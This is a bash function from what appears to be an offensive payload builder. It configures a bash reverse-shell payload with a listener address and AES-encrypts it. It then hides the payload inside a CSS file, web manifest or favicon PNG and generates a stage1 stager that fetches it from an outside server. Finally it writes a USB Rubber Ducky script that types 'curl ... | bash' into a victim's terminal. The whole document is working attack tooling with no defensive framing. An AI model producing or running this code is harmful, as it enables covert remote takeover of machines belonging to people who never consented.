#!/bin/bash

custom_payload_handler() {
  local LHOST="$1"
  local LPORT="$2"
  local WEB_IP="$3"
  local PORT_SERVE="$4"
  local DELIVERY="$5"
  local PROJECT_DIR="$6"
  local OUTPUT_DIR="$7"
  local WEB_DIR="$8"
  local KEY="$9"

  local PAYLOAD_DIR="$PROJECT_DIR/payloads/linux/bash_reverse"
  local STAGE2_RAW="$PAYLOAD_DIR/raw.sh"
  local STAGER_TEMPLATE="$PAYLOAD_DIR/template.sh"
  local TMP_PAYLOAD="$OUTPUT_DIR/tmp_raw_payload"
  local FINAL_STAGE1="$OUTPUT_DIR/stage1.sh"
  local FINAL_STAGE1_WEB="stage1.sh"

  # Validate required files
  [[ -f "$STAGE2_RAW" ]] || { echo "[!] Missing raw.sh"; exit 1; }
  [[ -f "$STAGER_TEMPLATE" ]] || { echo "[!] Missing template.sh"; exit 1; }

  # Replace IP and port
  cp "$STAGE2_RAW" "$TMP_PAYLOAD"
  sed -i "s/REPLACE_IP/$LHOST/g; s/REPLACE_PORT/$LPORT/g" "$TMP_PAYLOAD"

  echo "[*] Encrypting stage2 payload..."
  ENCODED=$(python3 "$PROJECT_DIR/tools/encrypt_aes.py" "$TMP_PAYLOAD" "$KEY") || {
    echo "[!] Encryption failed"; rm -f "$TMP_PAYLOAD"; exit 1;
  }
  echo "$ENCODED" > "$OUTPUT_DIR/encrypted_stage2.txt"
  rm -f "$TMP_PAYLOAD"

  # Embed in delivery file
  case "$DELIVERY" in
    css)
      python3 "$PROJECT_DIR/tools/embed_in_css.py" "$OUTPUT_DIR/encrypted_stage2.txt" "$WEB_DIR/style.css"
      DELIVERY_FILE="style.css"
      ;;
    manifest)
      python3 "$PROJECT_DIR/tools/embed_in_manifest.py" "$OUTPUT_DIR/encrypted_stage2.txt" "$WEB_DIR/manifest.json"
      DELIVERY_FILE="manifest.json"
      ;;
    png)
      python3 "$PROJECT_DIR/tools/embed_in_png.py" "$OUTPUT_DIR/encrypted_stage2.txt" "$WEB_DIR/favicon.png" "$WEB_DIR/favicon.png"
      DELIVERY_FILE="favicon.png"
      ;;
    *)
      echo "[!] Unknown delivery method"; exit 1
      ;;
  esac

  # Patch template with delivery and key
  DELIVERY_URL="http://$WEB_IP:$PORT_SERVE/$DELIVERY_FILE"
  KEY_ESCAPED=$(echo "$KEY" | sed -e 's/[\\/&]/\\\\&/g')

  STAGER_CONTENT=$(sed \
    -e "s|REPLACE_DELIVERY|$DELIVERY|g" \
    -e "s|REPLACE_URL|$DELIVERY_URL|g" \
    -e "s|REPLACE_KEY|$KEY_ESCAPED|g" \
    -e "s|REPLACE_AES|$ENCODED|g" \
    -e "s|REPLACE_IP|$LHOST|g" \
    -e "s|REPLACE_PORT|$LPORT|g" \
    "$STAGER_TEMPLATE")

  if echo "$STAGER_CONTENT" | grep -q 'REPLACE_'; then
    echo "[!] Unreplaced placeholders detected in stager template. Abort."
    exit 1
  fi

  echo "$STAGER_CONTENT" > "$FINAL_STAGE1"
  cp "$FINAL_STAGE1" "$WEB_DIR/$FINAL_STAGE1_WEB"

  echo "[+] Linux stage1 ready at http://$WEB_IP:$PORT_SERVE/$FINAL_STAGE1_WEB"

  # ===============================
  #    GENERATE CUSTOM DUCKY SCRIPT
  # ===============================
  DUCKY_FILE="$OUTPUT_DIR/ducky_payload.txt"

  cat > "$DUCKY_FILE" <<EOF
DELAY 1000
CTRL ALT t
DELAY 800
STRING curl -s http://$WEB_IP:$PORT_SERVE/$FINAL_STAGE1_WEB | bash
ENTER
EOF

  echo "[+] Ducky payload saved to $DUCKY_FILE"
}
